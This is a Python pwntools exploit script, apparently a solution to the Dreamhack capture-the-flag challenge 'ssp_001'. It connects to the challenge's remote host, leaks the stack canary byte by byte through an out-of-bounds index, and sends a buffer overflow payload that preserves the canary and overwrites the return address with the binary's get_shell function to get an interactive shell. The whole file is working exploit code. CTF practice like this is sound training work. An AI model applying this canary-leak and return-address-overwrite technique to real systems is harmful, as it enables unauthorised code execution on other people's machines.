#!/usr/bin/python3

from pwn import *

#p = process("./ssp_001")
p = remote("host1.dreamhack.games", 23646)
e = ELF("./ssp_001")

sla = lambda t, s: p.sendlineafter(t, s)
canary = b""
edi = b""

def leakCanary(idx):
    offset = 128
    sla(">", "P")
    sla(": ", str(offset + idx))
    p.recvuntil(": ")
    return p.recvn(2)

def overflow(payload):
    sla("> ", "E")
    sla(": ", str(len(payload) + 1))
    sla(": ", payload)

for i in range(3, 0 - 1, -1):
    canary += leakCanary(i)

canary = int(canary.decode('utf-8'), 16)
log.info("canary: " + hex(canary))

offset = 0x40
 
payload = "A".encode('utf-8') * offset
payload += p32(canary)
payload += p32(0x0)
payload += p32(0x0)
payload += p32(e.sym['get_shell'])

overflow(payload)

p.interactive()
